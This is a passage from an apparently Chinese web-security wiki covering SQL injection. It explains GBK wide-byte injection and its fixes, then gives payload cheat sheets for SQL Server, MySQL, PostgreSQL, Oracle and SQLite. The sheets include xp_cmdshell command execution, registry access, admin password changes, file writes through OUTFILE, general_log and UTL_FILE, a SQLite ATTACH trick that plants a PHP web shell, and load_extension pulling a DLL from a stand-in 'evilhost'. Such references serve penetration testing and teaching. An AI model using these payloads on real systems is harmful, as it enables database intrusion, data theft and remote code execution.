<li>二次注入有长度限制时，通过多句执行的方法改掉数据库该字段的长度绕过</li>
</ul>
</div>
<span id="document-vuln/sql/tricks"></span><div class="section" id="sql">
<h4>SQL注入小技巧<a class="headerlink" href="#sql" title="永久链接至标题">¶</a></h4>
<div class="section" id="id1">
<h5>宽字节注入<a class="headerlink" href="#id1" title="永久链接至标题">¶</a></h5>
<p>一般程序员用gbk编码做开发的时候，会用 <code class="docutils literal notranslate"><span class="pre">set</span> <span class="pre">names</span> <span class="pre">'gbk'</span></code> 来设定，这句话等同于</p>
<div class="highlight-default notranslate"><div class="highlight"><pre><span></span><span class="nb">set</span>
<span class="n">character_set_connection</span> <span class="o">=</span> <span class="s1">&#39;gbk&#39;</span><span class="p">,</span>
<span class="n">character_set_result</span> <span class="o">=</span> <span class="s1">&#39;gbk&#39;</span><span class="p">,</span>
<span class="n">character_set_client</span> <span class="o">=</span> <span class="s1">&#39;gbk&#39;</span><span class="p">;</span>
</pre></div>
</div>
<p>漏洞发生的原因是执行了 <code class="docutils literal notranslate"><span class="pre">set</span> <span class="pre">character_set_client</span> <span class="pre">=</span> <span class="pre">'gbk';</span></code> 之后，mysql就会认为客户端传过来的数据是gbk编码的，从而使用gbk去解码，而mysql_real_escape是在解码前执行的。但是直接用 <code class="docutils literal notranslate"><span class="pre">set</span> <span class="pre">names</span> <span class="pre">'gbk'</span></code> 的话real_escape是不知道设置的数据的编码的，就会加 <code class="docutils literal notranslate"><span class="pre">%5c</span></code> 。此时server拿到数据解码  就认为提交的字符+%5c是gbk的一个字符，这样就产生漏洞了。</p>
<p>解决的办法有三种，第一种是把client的charset设置为binary，就不会做一次解码的操作。第二种是是 <code class="docutils literal notranslate"><span class="pre">mysql_set_charset('gbk')</span></code> ，这里就会把编码的信息保存在和数据库的连接里面，就不会出现这个问题了。
第三种就是用pdo。</p>
<p>还有一些其他的编码技巧，比如latin会弃掉无效的unicode，那么admin%32在代码里面不等于admin，在数据库比较会等于admin。</p>
</div>
</div>
<span id="document-vuln/sql/cheatsheet/index"></span><div class="section" id="cheatsheet">
<h4>CheatSheet<a class="headerlink" href="#cheatsheet" title="永久链接至标题">¶</a></h4>
<div class="toctree-wrapper compound">
<span id="document-vuln/sql/cheatsheet/mssql"></span><div class="section" id="sql-server-payload">
<h5>SQL Server Payload<a class="headerlink" href="#sql-server-payload" title="永久链接至标题">¶</a></h5>
<div class="section" id="payload">
<h6>常见Payload<a class="headerlink" href="#payload" title="永久链接至标题">¶</a></h6>
<ul class="simple">
<li><dl class="first docutils">
<dt>Version</dt>
<dd><ul class="first last">
<li><code class="docutils literal notranslate"><span class="pre">SELECT</span> <span class="pre">&#64;&#64;version</span></code></li>
</ul>
</dd>
</dl>
</li>
<li><dl class="first docutils">
<dt>Comment</dt>
<dd><ul class="first last">
<li><code class="docutils literal notranslate"><span class="pre">SELECT</span> <span class="pre">1</span> <span class="pre">--</span> <span class="pre">comment</span></code></li>
<li><code class="docutils literal notranslate"><span class="pre">SELECT</span> <span class="pre">/*comment*/1</span></code></li>
</ul>
</dd>
</dl>
</li>
<li><dl class="first docutils">
<dt>Space</dt>
<dd><ul class="first last">
<li><code class="docutils literal notranslate"><span class="pre">0x01</span> <span class="pre">-</span> <span class="pre">0x20</span></code></li>
</ul>
</dd>
</dl>
</li>
<li><dl class="first docutils">
<dt>用户信息</dt>
<dd><ul class="first last">
<li><code class="docutils literal notranslate"><span class="pre">SELECT</span> <span class="pre">user_name()</span></code></li>
<li><code class="docutils literal notranslate"><span class="pre">SELECT</span> <span class="pre">system_user</span></code></li>
<li><code class="docutils literal notranslate"><span class="pre">SELECT</span> <span class="pre">user</span></code></li>
<li><code class="docutils literal notranslate"><span class="pre">SELECT</span> <span class="pre">loginame</span> <span class="pre">FROM</span> <span class="pre">master..sysprocesses</span> <span class="pre">WHERE</span> <span class="pre">spid</span> <span class="pre">=</span> <span class="pre">&#64;&#64;SPID</span></code></li>
</ul>
</dd>
</dl>
</li>
<li><dl class="first docutils">
<dt>用户权限</dt>
<dd><ul class="first last">
<li><code class="docutils literal notranslate"><span class="pre">select</span> <span class="pre">IS_SRVROLEMEMBER('sysadmin')</span></code></li>
<li><code class="docutils literal notranslate"><span class="pre">select</span> <span class="pre">IS_SRVROLEMEMBER('db_owner')</span></code></li>
</ul>
</dd>
</dl>
</li>
<li><dl class="first docutils">
<dt>List User</dt>
<dd><ul class="first last">
<li><code class="docutils literal notranslate"><span class="pre">SELECT</span> <span class="pre">name</span> <span class="pre">FROM</span> <span class="pre">master..syslogins</span></code></li>
</ul>
</dd>
</dl>
</li>
<li><dl class="first docutils">
<dt>数据库信息</dt>
<dd><ul class="first last">
<li><code class="docutils literal notranslate"><span class="pre">SELECT</span> <span class="pre">name</span> <span class="pre">FROM</span> <span class="pre">master..sysdatabases</span></code></li>
<li><code class="docutils literal notranslate"><span class="pre">select</span> <span class="pre">concat_ws(table_schema,table_name,column_name)</span> <span class="pre">from</span> <span class="pre">information_schema.columns</span></code></li>
<li><code class="docutils literal notranslate"><span class="pre">select</span> <span class="pre">quotename(name)</span> <span class="pre">from</span> <span class="pre">master..sysdatabases</span> <span class="pre">FOR</span> <span class="pre">XML</span> <span class="pre">PATH('')</span></code></li>
</ul>
</dd>
</dl>
</li>
<li><dl class="first docutils">
<dt>执行命令</dt>
<dd><ul class="first last">
<li><code class="docutils literal notranslate"><span class="pre">EXEC</span> <span class="pre">xp_cmdshell</span> <span class="pre">'net</span> <span class="pre">user'</span></code></li>
</ul>
</dd>
</dl>
</li>
<li><dl class="first docutils">
<dt>Ascii</dt>
<dd><ul class="first last">
<li><code class="docutils literal notranslate"><span class="pre">SELECT</span> <span class="pre">char(0x41)</span></code></li>
<li><code class="docutils literal notranslate"><span class="pre">SELECT</span> <span class="pre">ascii('A')</span></code></li>
<li><code class="docutils literal notranslate"><span class="pre">SELECT</span> <span class="pre">char(65)+char(66)</span></code> =&gt; return <code class="docutils literal notranslate"><span class="pre">AB</span></code></li>
</ul>
</dd>
</dl>
</li>
<li><dl class="first docutils">
<dt>Delay</dt>
<dd><ul class="first last">
<li><code class="docutils literal notranslate"><span class="pre">WAITFOR</span> <span class="pre">DELAY</span> <span class="pre">'0:0:3'</span></code> pause for 3 seconds</li>
</ul>
</dd>
</dl>
</li>
<li><dl class="first docutils">
<dt>Change Password</dt>
<dd><ul class="first last">
<li><code class="docutils literal notranslate"><span class="pre">ALTER</span> <span class="pre">LOGIN</span> <span class="pre">[sa]</span> <span class="pre">WITH</span> <span class="pre">PASSWORD=N'NewPassword'</span></code></li>
</ul>
</dd>
</dl>
</li>
<li><dl class="first docutils">
<dt>Trick</dt>
<dd><ul class="first last">
<li><code class="docutils literal notranslate"><span class="pre">id=1</span> <span class="pre">union:select</span> <span class="pre">password</span> <span class="pre">from:user</span></code></li>
</ul>
</dd>
</dl>
</li>
<li><dl class="first docutils">
<dt>文件读取</dt>
<dd><ul class="first last">
<li>OpenRowset</li>
</ul>
</dd>
</dl>
</li>
<li><dl class="first docutils">
<dt>当前查询语句</dt>
<dd><ul class="first last">
<li><code class="docutils literal notranslate"><span class="pre">select</span> <span class="pre">text</span> <span class="pre">from</span> <span class="pre">sys.dm_exec_requests</span> <span class="pre">cross</span> <span class="pre">apply</span> <span class="pre">sys.dm_exec_sql_text(sql_handle)</span></code></li>
</ul>
</dd>
</dl>
</li>
<li><dl class="first docutils">
<dt>hostname</dt>
<dd><ul class="first last">
<li>用于判断是否站库分离</li>
<li><code class="docutils literal notranslate"><span class="pre">select</span> <span class="pre">host_name()</span></code></li>
<li><code class="docutils literal notranslate"><span class="pre">exec</span> <span class="pre">xp_getnetname</span></code></li>
</ul>
</dd>
</dl>
</li>
<li><dl class="first docutils">
<dt>服务器信息</dt>
<dd><ul class="first last">
<li><code class="docutils literal notranslate"><span class="pre">exec</span> <span class="pre">xp_msver</span></code></li>
</ul>
</dd>
</dl>
</li>
</ul>
</div>
<div class="section" id="id1">
<h6>注册表读写<a class="headerlink" href="#id1" title="永久链接至标题">¶</a></h6>
<ul class="simple">
<li><dl class="first docutils">
<dt><code class="docutils literal notranslate"><span class="pre">xp_regread</span></code></dt>
<dd><ul class="first last">
<li><code class="docutils literal notranslate"><span class="pre">exec</span> <span class="pre">xp_regread</span> <span class="pre">N'HKEY_LOCAL_MACHINE',</span> <span class="pre">N'SYSTEM\CurrentControlSet\Services\MSSEARCH'</span></code></li>
</ul>
</dd>
</dl>
</li>
<li><code class="docutils literal notranslate"><span class="pre">xp_regwrite</span></code></li>
<li><code class="docutils literal notranslate"><span class="pre">xp_regdeletvalue</span></code></li>
<li><code class="docutils literal notranslate"><span class="pre">xp_regdeletkey</span></code></li>
<li><code class="docutils literal notranslate"><span class="pre">xp_regaddmultistring</span></code></li>
</ul>
</div>
<div class="section" id="id2">
<h6>报错注入<a class="headerlink" href="#id2" title="永久链接至标题">¶</a></h6>
<ul class="simple">
<li><code class="docutils literal notranslate"><span class="pre">1=convert(int,(db_name()))</span></code></li>
</ul>
</div>
<div class="section" id="id3">
<h6>常用函数<a class="headerlink" href="#id3" title="永久链接至标题">¶</a></h6>
<ul class="simple">
<li>SUSER_NAME()</li>
<li>USER_NAME()</li>
<li>PERMISSIONS()</li>
<li>DB_NAME()</li>
<li>FILE_NAME()</li>
<li>TYPE_NAME()</li>
<li>COL_NAME()</li>
</ul>
</div>
<div class="section" id="dns-oob">
<h6>DNS OOB<a class="headerlink" href="#dns-oob" title="永久链接至标题">¶</a></h6>
<ul class="simple">
<li>fn_xe_file_target_read_file</li>
<li>fn_get_audit_file</li>
<li>fn_trace_gettable</li>
</ul>
</div>
<div class="section" id="id4">
<h6>其他常用存储过程<a class="headerlink" href="#id4" title="永久链接至标题">¶</a></h6>
<ul class="simple">
<li>sp_execute_external_script</li>
<li>sp_makewebtask</li>
<li>sp_OACreate</li>
<li>sp_OADestroy</li>
<li>sp_OAGetErrorInfo</li>
<li>sp_OAGetProperty</li>
<li>sp_OAMethod</li>
<li>sp_OASetProperty</li>
<li>sp_OAStop</li>
<li>xp_cmdshell</li>
<li>xp_dirtree</li>
<li>xp_enumerrorlogs</li>
<li>xp_enumgroups</li>
<li>xp_fixeddrives</li>
<li>xp_getfiledetails</li>
<li>xp_loginconfig</li>
</ul>
</div>
</div>
<span id="document-vuln/sql/cheatsheet/mysql"></span><div class="section" id="mysql-payload">
<h5>MySQL Payload<a class="headerlink" href="#mysql-payload" title="永久链接至标题">¶</a></h5>
<div class="section" id="payload">
<h6>常见Payload<a class="headerlink" href="#payload" title="永久链接至标题">¶</a></h6>
<ul class="simple">
<li><dl class="first docutils">
<dt>Version</dt>
<dd><ul class="first last">
<li><code class="docutils literal notranslate"><span class="pre">SELECT</span> <span class="pre">&#64;&#64;version</span></code></li>
</ul>
</dd>
</dl>
</li>
<li><dl class="first docutils">
<dt>Comment</dt>
<dd><ul class="first last">
<li><code class="docutils literal notranslate"><span class="pre">SELECT</span> <span class="pre">1</span> <span class="pre">--</span> <span class="pre">comment</span></code></li>
<li><code class="docutils literal notranslate"><span class="pre">SELECT</span> <span class="pre">1</span> <span class="pre">#</span> <span class="pre">comment</span></code></li>
<li><code class="docutils literal notranslate"><span class="pre">SELECT</span> <span class="pre">/*comment*/1</span></code></li>
</ul>
</dd>
</dl>
</li>
<li><dl class="first docutils">
<dt>Space</dt>
<dd><ul class="first last">
<li><code class="docutils literal notranslate"><span class="pre">0x9</span></code> <code class="docutils literal notranslate"><span class="pre">0xa-0xd</span></code> <code class="docutils literal notranslate"><span class="pre">0x20</span></code> <code class="docutils literal notranslate"><span class="pre">0xa0</span></code></li>
</ul>
</dd>
</dl>
</li>
<li><dl class="first docutils">
<dt>Current User</dt>
<dd><ul class="first last">
<li><code class="docutils literal notranslate"><span class="pre">SELECT</span> <span class="pre">user()</span></code></li>
<li><code class="docutils literal notranslate"><span class="pre">SELECT</span> <span class="pre">system_user()</span></code></li>
</ul>
</dd>
</dl>
</li>
<li><dl class="first docutils">
<dt>List User</dt>
<dd><ul class="first last">
<li><code class="docutils literal notranslate"><span class="pre">SELECT</span> <span class="pre">user</span> <span class="pre">FROM</span> <span class="pre">mysql.user</span></code></li>
</ul>
</dd>
</dl>
</li>
<li><dl class="first docutils">
<dt>Current Database</dt>
<dd><ul class="first last">
<li><code class="docutils literal notranslate"><span class="pre">SELECT</span> <span class="pre">database()</span></code></li>
</ul>
</dd>
</dl>
</li>
<li><dl class="first docutils">
<dt>List Database</dt>
<dd><ul class="first last">
<li><code class="docutils literal notranslate"><span class="pre">SELECT</span> <span class="pre">schema_name</span> <span class="pre">FROM</span> <span class="pre">information_schema.schemata</span></code></li>
</ul>
</dd>
</dl>
</li>
<li><dl class="first docutils">
<dt>List Tables</dt>
<dd><ul class="first last">
<li><code class="docutils literal notranslate"><span class="pre">SELECT</span> <span class="pre">table_schema,table_name</span> <span class="pre">FROM</span> <span class="pre">information_schema.tables</span> <span class="pre">WHERE</span> <span class="pre">table_schema</span> <span class="pre">!=</span> <span class="pre">'mysql'</span> <span class="pre">AND</span> <span class="pre">table_schema</span> <span class="pre">!=</span> <span class="pre">'information_schema'</span></code></li>
</ul>
</dd>
</dl>
</li>
<li><dl class="first docutils">
<dt>List Columns</dt>
<dd><ul class="first last">
<li><code class="docutils literal notranslate"><span class="pre">SELECT</span> <span class="pre">table_schema,</span> <span class="pre">table_name,</span> <span class="pre">column_name</span> <span class="pre">FROM</span> <span class="pre">information_schema.columns</span> <span class="pre">WHERE</span> <span class="pre">table_schema</span> <span class="pre">!=</span> <span class="pre">'mysql'</span> <span class="pre">AND</span> <span class="pre">table_schema</span> <span class="pre">!=</span> <span class="pre">'information_schema'</span></code></li>
</ul>
</dd>
</dl>
</li>
<li><dl class="first docutils">
<dt>If</dt>
<dd><ul class="first last">
<li><code class="docutils literal notranslate"><span class="pre">SELECT</span> <span class="pre">if(1=1,'foo','bar');</span></code> return 'foo'</li>
</ul>
</dd>
</dl>
</li>
<li><dl class="first docutils">
<dt>Ascii</dt>
<dd><ul class="first last">
<li><code class="docutils literal notranslate"><span class="pre">SELECT</span> <span class="pre">char(0x41)</span></code></li>
<li><code class="docutils literal notranslate"><span class="pre">SELECT</span> <span class="pre">ascii('A')</span></code></li>
<li><code class="docutils literal notranslate"><span class="pre">SELECT</span> <span class="pre">0x414243</span></code> =&gt; return <code class="docutils literal notranslate"><span class="pre">ABC</span></code></li>
</ul>
</dd>
</dl>
</li>
<li><dl class="first docutils">
<dt>Delay</dt>
<dd><ul class="first last">
<li><code class="docutils literal notranslate"><span class="pre">sleep(1)</span></code></li>
<li><code class="docutils literal notranslate"><span class="pre">SELECT</span> <span class="pre">BENCHMARK(1000000,MD5('A'))</span></code></li>
</ul>
</dd>
</dl>
</li>
<li><dl class="first docutils">
<dt>Read File</dt>
<dd><ul class="first last">
<li><code class="docutils literal notranslate"><span class="pre">select</span> <span class="pre">&#64;&#64;datadir</span></code></li>
<li><code class="docutils literal notranslate"><span class="pre">select</span> <span class="pre">load_file('databasename/tablename.MYD')</span></code></li>
</ul>
</dd>
</dl>
</li>
<li><dl class="first docutils">
<dt>Blind</dt>
<dd><ul class="first last">
<li><code class="docutils literal notranslate"><span class="pre">ascii(substring(str,pos,length))</span> <span class="pre">&amp;</span> <span class="pre">32</span> <span class="pre">=</span> <span class="pre">1</span></code></li>
</ul>
</dd>
</dl>
</li>
<li><dl class="first docutils">
<dt>Error Based</dt>
<dd><ul class="first last">
<li><code class="docutils literal notranslate"><span class="pre">select</span> <span class="pre">count(*),(floor(rand(0)*2))x</span> <span class="pre">from</span> <span class="pre">information_schema.tables</span> <span class="pre">group</span> <span class="pre">by</span> <span class="pre">x;</span></code></li>
<li><code class="docutils literal notranslate"><span class="pre">select</span> <span class="pre">count(*)</span> <span class="pre">from</span> <span class="pre">(select</span> <span class="pre">1</span> <span class="pre">union</span> <span class="pre">select</span> <span class="pre">null</span> <span class="pre">union</span> <span class="pre">select</span> <span class="pre">!1)x</span> <span class="pre">group</span> <span class="pre">by</span> <span class="pre">concat((select</span> <span class="pre">table_name</span> <span class="pre">from</span> <span class="pre">information_schema.tables</span> <span class="pre">limit</span> <span class="pre">1),floor(rand(0)*2))</span></code></li>
</ul>
</dd>
</dl>
</li>
<li><dl class="first docutils">
<dt>Change Password</dt>
<dd><ul class="first last">
<li><code class="docutils literal notranslate"><span class="pre">mysql</span> <span class="pre">-uroot</span> <span class="pre">-e</span> <span class="pre">&quot;use</span> <span class="pre">mysql;UPDATE</span> <span class="pre">user</span> <span class="pre">SET</span> <span class="pre">password=PASSWORD('newpassword')</span> <span class="pre">WHERE</span> <span class="pre">user='root';FLUSH</span> <span class="pre">PRIVILEGES;&quot;</span></code></li>
</ul>
</dd>
</dl>
</li>
</ul>
<div class="section" id="id1">
<h7>报错注入常见函数<a class="headerlink" href="#id1" title="永久链接至标题">¶</a></h7>
<ul class="simple">
<li>extractvalue</li>
<li>updatexml</li>
<li>GeometryCollection</li>
<li>linestring</li>
<li>multilinestring</li>
<li>multipoint</li>
<li>multipolygon</li>
<li>polygon</li>
<li>exp</li>
</ul>
</div>
</div>
<div class="section" id="id2">
<h6>写文件<a class="headerlink" href="#id2" title="永久链接至标题">¶</a></h6>
<div class="section" id="id3">
<h7>写文件前提<a class="headerlink" href="#id3" title="永久链接至标题">¶</a></h7>
<ul class="simple">
<li>root 权限</li>
<li>知晓文件绝对路径</li>
<li>写入的路径存在写入权限</li>
<li>secure_file_priv 允许向对应位置写入</li>
<li><code class="docutils literal notranslate"><span class="pre">select</span> <span class="pre">count(file_priv)</span> <span class="pre">from</span> <span class="pre">mysql.user</span></code></li>
</ul>
</div>
<div class="section" id="into">
<h7>基于 into 写文件<a class="headerlink" href="#into" title="永久链接至标题">¶</a></h7>
<div class="highlight-sql notranslate"><div class="highlight"><pre><span></span><span class="k">union</span> <span class="k">select</span> <span class="mi">1</span><span class="p">,</span><span class="mi">1</span><span class="p">,</span><span class="mi">1</span> <span class="k">into</span> <span class="n">outfile</span> <span class="s1">&#39;/tmp/demo.txt&#39;</span>
<span class="k">union</span> <span class="k">select</span> <span class="mi">1</span><span class="p">,</span><span class="mi">1</span><span class="p">,</span><span class="mi">1</span> <span class="k">into</span> <span class="n">dumpfile</span> <span class="s1">&#39;/tmp/demo.txt&#39;</span>
</pre></div>
</div>
<p>dumpfile和outfile不同在于，outfile会在行末端写入新行，会转义换行符，如果写入二进制文件，很可能被这种特性破坏</p>
</div>
<div class="section" id="log">
<h7>基于 log 写文件<a class="headerlink" href="#log" title="永久链接至标题">¶</a></h7>
<div class="highlight-sql notranslate"><div class="highlight"><pre><span></span><span class="k">show</span> <span class="n">variables</span> <span class="k">like</span> <span class="s1">&#39;%general%&#39;</span><span class="p">;</span>
<span class="k">set</span> <span class="k">global</span> <span class="n">general_log</span> <span class="o">=</span> <span class="k">on</span><span class="p">;</span>
<span class="k">set</span> <span class="k">global</span> <span class="n">general_log_file</span> <span class="o">=</span> <span class="s1">&#39;/path/to/file&#39;</span><span class="p">;</span>
<span class="k">select</span> <span class="s1">&#39;&lt;?php var_dump(&quot;test&quot;);?&gt;&#39;</span><span class="p">;</span>
<span class="k">set</span> <span class="k">global</span> <span class="n">general_log_file</span> <span class="o">=</span> <span class="s1">&#39;/original/path&#39;</span><span class="p">;</span>
<span class="k">set</span> <span class="k">global</span> <span class="n">general_log</span> <span class="o">=</span> <span class="k">off</span><span class="p">;</span>
</pre></div>
</div>
</div>
</div>
</div>
<span id="document-vuln/sql/cheatsheet/psql"></span><div class="section" id="postgressql-payload">
<h5>PostgresSQL Payload<a class="headerlink" href="#postgressql-payload" title="永久链接至标题">¶</a></h5>
<ul class="simple">
<li><dl class="first docutils">
<dt>Version</dt>
<dd><ul class="first last">
<li><code class="docutils literal notranslate"><span class="pre">SELECT</span> <span class="pre">version()</span></code></li>
</ul>
</dd>
</dl>
</li>
<li><dl class="first docutils">
<dt>Comment</dt>
<dd><ul class="first last">
<li><code class="docutils literal notranslate"><span class="pre">SELECT</span> <span class="pre">1</span> <span class="pre">--</span> <span class="pre">comment</span></code></li>
<li><code class="docutils literal notranslate"><span class="pre">SELECT</span> <span class="pre">/*comment*/1</span></code></li>
</ul>
</dd>
</dl>
</li>
<li><dl class="first docutils">
<dt>Current User</dt>
<dd><ul class="first last">
<li><code class="docutils literal notranslate"><span class="pre">SELECT</span> <span class="pre">user</span></code></li>
<li><code class="docutils literal notranslate"><span class="pre">SELECT</span> <span class="pre">current_user</span></code></li>
<li><code class="docutils literal notranslate"><span class="pre">SELECT</span> <span class="pre">session_user</span></code></li>
<li><code class="docutils literal notranslate"><span class="pre">SELECT</span> <span class="pre">getpgusername()</span></code></li>
</ul>
</dd>
</dl>
</li>
<li><dl class="first docutils">
<dt>List User</dt>
<dd><ul class="first last">
<li><code class="docutils literal notranslate"><span class="pre">SELECT</span> <span class="pre">usename</span> <span class="pre">FROM</span> <span class="pre">pg_user</span></code></li>
</ul>
</dd>
</dl>
</li>
<li><dl class="first docutils">
<dt>Current Database</dt>
<dd><ul class="first last">
<li><code class="docutils literal notranslate"><span class="pre">SELECT</span> <span class="pre">current_database()</span></code></li>
</ul>
</dd>
</dl>
</li>
<li><dl class="first docutils">
<dt>List Database</dt>
<dd><ul class="first last">
<li><code class="docutils literal notranslate"><span class="pre">SELECT</span> <span class="pre">datname</span> <span class="pre">FROM</span> <span class="pre">pg_database</span></code></li>
</ul>
</dd>
</dl>
</li>
<li><dl class="first docutils">
<dt>Ascii</dt>
<dd><ul class="first last">
<li><code class="docutils literal notranslate"><span class="pre">SELECT</span> <span class="pre">char(0x41)</span></code></li>
<li><code class="docutils literal notranslate"><span class="pre">SELECT</span> <span class="pre">ascii('A')</span></code></li>
</ul>
</dd>
</dl>
</li>
<li><dl class="first docutils">
<dt>Delay</dt>
<dd><ul class="first last">
<li><code class="docutils literal notranslate"><span class="pre">pg_sleep(1)</span></code></li>
</ul>
</dd>
</dl>
</li>
</ul>
</div>
<span id="document-vuln/sql/cheatsheet/oracle"></span><div class="section" id="oracle-payload">
<h5>Oracle Payload<a class="headerlink" href="#oracle-payload" title="永久链接至标题">¶</a></h5>
<div class="section" id="payload">
<h6>常见Payload<a class="headerlink" href="#payload" title="永久链接至标题">¶</a></h6>
<ul class="simple">
<li><dl class="first docutils">
<dt>dump</dt>
<dd><ul class="first last">
<li><code class="docutils literal notranslate"><span class="pre">select</span> <span class="pre">*</span> <span class="pre">from</span> <span class="pre">v$tablespace;</span></code></li>
<li><code class="docutils literal notranslate"><span class="pre">select</span> <span class="pre">*</span> <span class="pre">from</span> <span class="pre">user_tables;</span></code></li>
<li><code class="docutils literal notranslate"><span class="pre">select</span> <span class="pre">column_name</span> <span class="pre">from</span> <span class="pre">user_tab_columns</span> <span class="pre">where</span> <span class="pre">table_name</span> <span class="pre">=</span> <span class="pre">'table_name';</span></code></li>
<li><code class="docutils literal notranslate"><span class="pre">select</span> <span class="pre">column_name,</span> <span class="pre">data_type</span> <span class="pre">from</span> <span class="pre">user_tab_columns</span> <span class="pre">where</span> <span class="pre">table_name</span> <span class="pre">=</span> <span class="pre">'table_name';</span></code></li>
<li><code class="docutils literal notranslate"><span class="pre">SELECT</span> <span class="pre">*</span> <span class="pre">FROM</span> <span class="pre">ALL_TABLES</span></code></li>
</ul>
</dd>
</dl>
</li>
<li><dl class="first docutils">
<dt>Comment</dt>
<dd><ul class="first last">
<li><code class="docutils literal notranslate"><span class="pre">--</span></code></li>
<li><code class="docutils literal notranslate"><span class="pre">/**/</span></code></li>
</ul>
</dd>
</dl>
</li>
<li><dl class="first docutils">
<dt>Space</dt>
<dd><ul class="first last">
<li><code class="docutils literal notranslate"><span class="pre">0x00</span></code> <code class="docutils literal notranslate"><span class="pre">0x09</span></code> <code class="docutils literal notranslate"><span class="pre">0xa-0xd</span></code> <code class="docutils literal notranslate"><span class="pre">0x20</span></code></li>
</ul>
</dd>
</dl>
</li>
<li><dl class="first docutils">
<dt>报错</dt>
<dd><ul class="first last">
<li><code class="docutils literal notranslate"><span class="pre">utl_inaddr.get_host_name</span></code></li>
<li><code class="docutils literal notranslate"><span class="pre">ctxsys.drithsx.sn</span></code></li>
<li><code class="docutils literal notranslate"><span class="pre">ctxsys.CTX_REPORT.TOKEN_TYPE</span></code></li>
<li><code class="docutils literal notranslate"><span class="pre">XMLType</span></code></li>
<li><code class="docutils literal notranslate"><span class="pre">dbms_xdb_version.checkin</span></code></li>
<li><code class="docutils literal notranslate"><span class="pre">dbms_xdb_version.makeversioned</span></code></li>
<li><code class="docutils literal notranslate"><span class="pre">dbms_xdb_version.uncheckout</span></code></li>
<li><code class="docutils literal notranslate"><span class="pre">dbms_utility.sqlid_to_sqlhash</span></code></li>
<li><code class="docutils literal notranslate"><span class="pre">ordsys.ord_dicom.getmappingxpath</span></code></li>
<li><code class="docutils literal notranslate"><span class="pre">utl_inaddr.get_host_name</span></code></li>
<li><code class="docutils literal notranslate"><span class="pre">utl_inaddr.get_host_address</span></code></li>
</ul>
</dd>
</dl>
</li>
<li><dl class="first docutils">
<dt>OOB</dt>
<dd><ul class="first last">
<li><code class="docutils literal notranslate"><span class="pre">utl_http.request</span></code></li>
<li><code class="docutils literal notranslate"><span class="pre">utl_inaddr.get_host_address</span></code></li>
<li><code class="docutils literal notranslate"><span class="pre">SYS.DBMS_LDAP.INIT</span></code></li>
<li><code class="docutils literal notranslate"><span class="pre">HTTPURITYPE</span></code></li>
<li><code class="docutils literal notranslate"><span class="pre">HTTP_URITYPE.GETCLOB</span></code></li>
</ul>
</dd>
</dl>
</li>
<li><dl class="first docutils">
<dt>绕过</dt>
<dd><ul class="first last">
<li><code class="docutils literal notranslate"><span class="pre">rawtohex</span></code></li>
</ul>
</dd>
</dl>
</li>
</ul>
</div>
<div class="section" id="id1">
<h6>写文件<a class="headerlink" href="#id1" title="永久链接至标题">¶</a></h6>
<div class="highlight-sql notranslate"><div class="highlight"><pre><span></span><span class="k">create</span> <span class="k">or</span> <span class="k">replace</span> <span class="n">directory</span> <span class="n">TEST_DIR</span> <span class="k">as</span> <span class="s1">&#39;/path/to/dir&#39;</span><span class="p">;</span>
<span class="k">grant</span> <span class="k">read</span><span class="p">,</span> <span class="k">write</span> <span class="k">on</span> <span class="n">directory</span> <span class="n">TEST_DIR</span> <span class="k">to</span> <span class="k">system</span><span class="p">;</span>
<span class="k">declare</span>
   <span class="n">isto_file</span> <span class="n">utl_file</span><span class="p">.</span><span class="n">file_type</span><span class="p">;</span>
<span class="k">begin</span>
   <span class="n">isto_file</span> <span class="p">:</span><span class="o">=</span> <span class="n">utl_file</span><span class="p">.</span><span class="n">fopen</span><span class="p">(</span><span class="s1">&#39;TEST_DIR&#39;</span><span class="p">,</span> <span class="s1">&#39;test.jsp&#39;</span><span class="p">,</span> <span class="s1">&#39;W&#39;</span><span class="p">);</span>
   <span class="n">utl_file</span><span class="p">.</span><span class="n">put_line</span><span class="p">(</span><span class="n">isto_file</span><span class="p">,</span> <span class="s1">&#39;&lt;% out.println(&quot;test&quot;); %&gt;&#39;</span><span class="p">);</span>
   <span class="n">utl_file</span><span class="p">.</span><span class="n">fflush</span><span class="p">(</span><span class="n">isto_file</span><span class="p">);</span>
   <span class="n">utl_file</span><span class="p">.</span><span class="n">fclose</span><span class="p">(</span><span class="n">isto_file</span><span class="p">);</span>
<span class="k">end</span><span class="p">;</span>
</pre></div>
</div>
</div>
</div>
<span id="document-vuln/sql/cheatsheet/sqlite3"></span><div class="section" id="sqlite3-payload">
<h5>SQLite3 Payload<a class="headerlink" href="#sqlite3-payload" title="永久链接至标题">¶</a></h5>
<ul class="simple">
<li><dl class="first docutils">
<dt>Comment</dt>
<dd><ul class="first last">
<li><code class="docutils literal notranslate"><span class="pre">--</span></code></li>
<li><code class="docutils literal notranslate"><span class="pre">/**/</span></code></li>
</ul>
</dd>
</dl>
</li>
<li><dl class="first docutils">
<dt>Version</dt>
<dd><ul class="first last">
<li><code class="docutils literal notranslate"><span class="pre">select</span> <span class="pre">sqlite_version();</span></code></li>
</ul>
</dd>
</dl>
</li>
</ul>
<p>Command Execution</p>
<div class="highlight-sql notranslate"><div class="highlight"><pre><span></span><span class="n">ATTACH</span> <span class="k">DATABASE</span> <span class="s1">&#39;/var/www/lol.php&#39;</span> <span class="k">AS</span> <span class="n">lol</span><span class="p">;</span>
<span class="k">CREATE</span> <span class="k">TABLE</span> <span class="n">lol</span><span class="p">.</span><span class="n">pwn</span> <span class="p">(</span><span class="n">dataz</span> <span class="nb">text</span><span class="p">);</span>
<span class="k">INSERT</span> <span class="k">INTO</span> <span class="n">lol</span><span class="p">.</span><span class="n">pwn</span> <span class="p">(</span><span class="n">dataz</span><span class="p">)</span> <span class="k">VALUES</span> <span class="p">(</span><span class="s1">&#39;&lt;?system($_GET[&#39;</span><span class="n">cmd</span><span class="s1">&#39;]); ?&gt;&#39;</span><span class="p">);</span><span class="c1">--</span>
</pre></div>
</div>
<p>Load_extension</p>
<p><code class="docutils literal notranslate"><span class="pre">UNION</span> <span class="pre">SELECT</span> <span class="pre">1,load_extension('\\evilhost\evil.dll','E');--</span></code></p>
</div>
</div>
</div>
<span id="document-vuln/sql/precompile"></span><div class="section" id="id1">
<h4>预编译<a class="headerlink" href="#id1" title="永久链接至标题">¶</a></h4>
<div class="section" id="id2">
<h5>简介<a class="headerlink" href="#id2" title="永久链接至标题">¶</a></h5>
